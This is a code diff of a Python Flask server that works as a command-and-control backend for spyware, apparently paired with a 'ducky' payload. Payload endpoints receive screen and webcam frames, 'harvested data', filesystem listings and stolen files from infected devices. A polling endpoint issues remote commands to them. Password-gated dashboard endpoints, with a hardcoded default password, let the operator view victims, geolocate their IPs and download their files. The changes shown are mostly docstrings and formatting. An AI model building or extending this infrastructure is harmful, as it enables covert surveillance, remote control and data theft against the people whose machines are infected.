@@ -14,15 +14,16 @@ CORS(app)
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY") # MAKE SURE THIS IS THE SERVICE_ROLE KEY!
 
-# --- SECURITY MEASURE ---
+# --- NEW SECURITY MEASURE ---
 # This stops random people from guessing your Render URL and reading your logs.
+# You can change "ducky_admin_2024" to any secret password you want.
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")
 
 # --- IN-MEMORY CACHES ---
 command_queue = {}
 frame_cache = {}
 filesystem_cache = {}
-file_download_cache = {}
+file_download_cache = {} 
 
 # ---------------------------------------------------------
 # HELPER FUNCTIONS
@@ -30,7 +31,7 @@ file_download_cache = {}
 def get_node_status(last_seen_str):
     if not last_seen_str: 
         return "red", "Offline"
-    
+        
     last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
     now = datetime.now(timezone.utc)
     
@@ -44,6 +45,7 @@ def get_node_status(last_seen_str):
 def geolocate_ip(ip):
     if not ip or ip in ["127.0.0.1", "Unknown"]: 
         return 28.5383, -81.3792 
+        
     try:
         response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
         if response.ok:
@@ -52,20 +54,25 @@ def geolocate_ip(ip):
                 return float(data.get("lat")), float(data.get("lon"))
     except:
         pass
+        
     return 28.5383, -81.3792 
 
 # ---------------------------------------------------------
-# DASHBOARD ENDPOINTS
+# DASHBOARD ENDPOINTS (Proxy to Supabase & Memory)
 # ---------------------------------------------------------
 @app.route('/node/<device_id>', methods=['GET'])
 def get_single_node(device_id):
+    """Fetches summary data (IP, OS, Last Seen, Location) for ONE node."""
     if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
         return jsonify({"error": "Unauthorized access"}), 401
 
     if not SUPABASE_KEY or not SUPABASE_URL:
         return jsonify({"error": "Supabase key/URL missing in Render Environment"}), 500
 
-    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
+    headers = {
+        "apikey": SUPABASE_KEY, 
+        "Authorization": f"Bearer {SUPABASE_KEY}"
+    }
     
     try:
         time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
@@ -109,13 +116,17 @@ def get_single_node(device_id):
 
 @app.route('/logs/<device_id>', methods=['GET'])
 def get_logs(device_id):
+    """Fetches all harvested data logs for ONE node."""
     if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
         return jsonify({"error": "Unauthorized access"}), 401
 
     if not SUPABASE_KEY or not SUPABASE_URL:
         return jsonify({"error": "Supabase Configuration missing"}), 500
 
-    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
+    headers = {
+        "apikey": SUPABASE_KEY, 
+        "Authorization": f"Bearer {SUPABASE_KEY}"
+    }
     url = f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc"
     
     try:
@@ -127,11 +138,13 @@ def get_logs(device_id):
 
 @app.route('/frames/<device_id>/<cache_key>', methods=['GET'])
 def get_frame(device_id, cache_key):
+    """Dashboard polls this to get the latest frame."""
     if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
         return jsonify({"error": "Unauthorized access"}), 401
 
     device_frames = frame_cache.get(device_id, {})
-    frame = device_frames.pop(cache_key, None)
+    # Use .get() instead of .pop() so rapid streaming doesn't get 404s
+    frame = device_frames.get(cache_key, None)
 
     if frame:
         return jsonify({"frame": frame}), 200
@@ -140,6 +153,7 @@ def get_frame(device_id, cache_key):
 
 @app.route('/fs/<device_id>', methods=['GET'])
 def get_fs_data(device_id):
+    """Dashboard polls this to get the latest filesystem data."""
     if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
         return jsonify({"error": "Unauthorized access"}), 401
 
@@ -156,24 +170,27 @@ def get_fs_data(device_id):
 
 @app.route('/fs_download/<device_id>', methods=['GET'])
 def get_fs_download(device_id):
+    """Dashboard polls this to get the ready downloaded file."""
     if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
         return jsonify({"error": "Unauthorized access"}), 401
         
     json_data = file_download_cache.pop(device_id, None)
     
     if json_data:
-        try: 
-            return jsonify(json.loads(json_data)), 200
-        except Exception: 
+        try:
+            parsed_data = json.loads(json_data)
+            return jsonify(parsed_data), 200
+        except Exception:
             return jsonify({"error": "Invalid format"}), 500
-            
-    return jsonify({"error": "File not ready"}), 404
+    else:
+        return jsonify({"error": "File not ready"}), 404
 
 # ---------------------------------------------------------
 # PAYLOAD ENDPOINTS
 # ---------------------------------------------------------
 @app.route('/frames', methods=['POST'])
 def push_frame():
+    """Payload posts new screen/webcam frames here."""
     data = request.json
     device_id = data.get("device_id")
     frame_type = data.get("frame_type") 
@@ -193,6 +210,7 @@ def push_frame():
 
 @app.route('/logs', methods=['POST'])
 def push_logs():
+    """Payload posts new harvested data here."""
     data = request.json
     
     # Intercept Filesystem List Data
@@ -202,10 +220,10 @@ def push_logs():
             filesystem_cache[device_id] = data.get("content")
         return jsonify({"status": "fs data cached"}), 200
         
-    # Intercept Downloaded Files
+    # Intercept Downloaded Files Data
     if data and data.get("category") == "file_download_data":
         device_id = data.get("device_id")
-        if device_id: 
+        if device_id:
             file_download_cache[device_id] = data.get("content")
         return jsonify({"status": "download cached"}), 200
 
@@ -243,6 +261,7 @@ def issue_command():
 
 @app.route('/poll/<device_id>', methods=['GET'])
 def poll_for_command(device_id):
+    """Payload continuously asks this endpoint for commands."""
     command = command_queue.pop(device_id, None)
     return jsonify({"command": command})
 
